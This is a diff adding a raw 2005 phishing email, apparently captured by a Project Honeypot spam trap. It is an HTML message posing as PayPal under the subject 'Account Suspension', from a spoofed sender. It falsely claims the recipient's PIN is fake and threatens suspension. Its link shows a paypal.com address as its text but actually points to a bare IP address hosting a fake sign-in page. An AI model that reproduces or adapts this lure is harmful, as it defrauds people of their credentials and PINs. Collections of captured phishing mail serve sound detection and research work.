@@ -1,0 +1,112 @@
+Received: from cobalt01.prodyna.com (HELO cobalt01.hosting-expert.de) (62.80.99.200)
+  by projecthoneypotmailserver with SMTP; 3 Jul 2005 14:44:00 -0000
+Received: (from root@localhost)
+	by cobalt01.hosting-expert.de (8.10.2/8.10.2) id j63EqBI27835;
+	Sun, 3 Jul 2005 16:52:11 +0200
+Date: Sun, 3 Jul 2005 16:52:11 +0200
+Message-Id: <200507031452.j63EqBI27835@cobalt01.hosting-expert.de>
+To: projecthoneypot@projecthoneypot.org
+Subject: Account Suspension
+From: PayPal  <pp@paypal.com>
+Content-Type: text/html
+
+
+<html>
+<head>
+<title>Paypal-Account Alert</title>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
+</head>
+
+<body>
+<table width="100%" border="0" cellspacing="0" cellpadding="0">
+  <tr> 
+      <td><img src="http://images.paypal.com/en_US/i/logo/email_logo.gif"></td>
+        </tr>
+	  <tr> 
+	      <td height="20" bgcolor="#003366"> </td>
+	        </tr>
+		  <tr> 
+		      <td>  </td>
+		        </tr>
+			  <tr>
+			      <td valign="top"><table width="65%" border="0" cellspacing="0" cellpadding="0">
+			              <tr> 
+				                <td width="2%"> </td>
+						          <td width="94%"><font color="#003366" size="2" face="Verdana, Arial, Helvetica, sans-serif"><strong>Dear 
+							              Paypal User,</strong></font></td>
+								              </tr>
+									              <tr> 
+										                <td> </td>
+												          <td> </td>
+													          </tr>
+														          <tr> 
+															            <td> </td>
+																              <td><font size="2" face="Verdana, Arial, Helvetica, sans-serif">In accordance 
+																	                  with our major database relocation, we are currently having major 
+																			              adjustments and updates of user accounts to verify that the informations 
+																				                  you have provided with us during the sign-up process are true and 
+																						              correct. However, we have noticed that <strong>the PIN Number you updated on file is fake</strong>.  PayPal requires your Personal Identification Number as the latest security measure against: identity theft, credit card fraud and unauthorized account access. PayPal will verify it with your bank records for your own protection. 
+
+If you provide a wrong PIN your account will be suspended for unauthorized account access. Due our latest security improvements PayPal became a global leader in online payments. 
+</font></td>
+																										              </tr>
+																											              <tr> 
+																												                <td> </td>
+																														          <td> </td>
+																															          </tr>
+																																          <tr> 
+																																	            <td> </td>
+																																		              <td><font size="2" face="Verdana, Arial, Helvetica, sans-serif">We require 
+																																			                  you to complete an <strong>account verification</strong> procedure 
+																																					              as part of our security measure.</font></td>
+																																						              </tr>
+																																							              <tr> 
+																																								                <td> </td>
+																																										          <td> </td>
+																																											          </tr>
+																																												          <tr> 
+																																													            <td> </td>
+																																														              <td><font size="2" face="Verdana, Arial, Helvetica, sans-serif">You 
+																																															                  must <strong>click the link</strong> below to complete the process.</font></td>
+																																																	          </tr>
+																																																		          <tr> 
+																																																			            <td> </td>
+																																																				              <td align="left" valign="top"> 
+																																																					                  <p><font size="2" face="Verdana, Arial, Helvetica, sans-serif"><a href="http://148.204.187.111/secure_Site/paypal.com/index.php?MfcISAPICommand=SignInFPP&UsingSSL=1">https://www.paypal.com/cgi-bin/webscr?cmd=_login-run</a></font></p></td>
+																																																							          </tr>
+																																																								          <tr> 
+																																																									            <td> </td>
+																																																										              <td> </td>
+																																																											              </tr>
+																																																												              <tr> 
+																																																													                <td> </td>
+																																																															          <td align="left" valign="top"> <p><font size="2" face="Verdana, Arial, Helvetica, sans-serif">Unable 
+																																																																                to do so may result to abnormal account behavior during transactions.</font></p></td>
+																																																																		        </tr>
+																																																																			        <tr> 
+																																																																				          <td> </td>
+																																																																					            <td> </td>
+																																																																						            </tr>
+																																																																							            <tr> 
+																																																																								              <td> </td>
+																																																																									                <td align="left"> <p><font size="2" face="Verdana, Arial, Helvetica, sans-serif">Thank 
+																																																																											              you for using PayPal!<br>
+																																																																												                    The PayPal Team</font></p></td>
+																																																																														            </tr>
+																																																																															            <tr> 
+																																																																																              <td> </td>
+																																																																																	                <td><hr align="left" noshade></td>
+																																																																																			        </tr>
+																																																																																				        <tr>
+																																																																																					          <td> </td>
+																																																																																						            <td align="left" valign="top"><font color="#999999" size="1" face="Verdana, Arial, Helvetica, sans-serif">Please 
+																																																																																							                do not reply to this e-mail. Mail sent to this address cannot be answered. 
+																																																																																									            For assistance, log in to your PayPal account and choose the "Help" 
+																																																																																										                link in the footer of any page. </font> 
+																																																																																												            <p><font size="1"><font color="#999999" face="Verdana, Arial, Helvetica, sans-serif">PayPal 
+																																																																																													                  Email ID PP096</font></font></p></td>
+																																																																																															          </tr>
+																																																																																																        </table> </td>
+																																																																																																	  </tr>
+																																																																																																	  </table>
+																																																																																																	  </body></html>
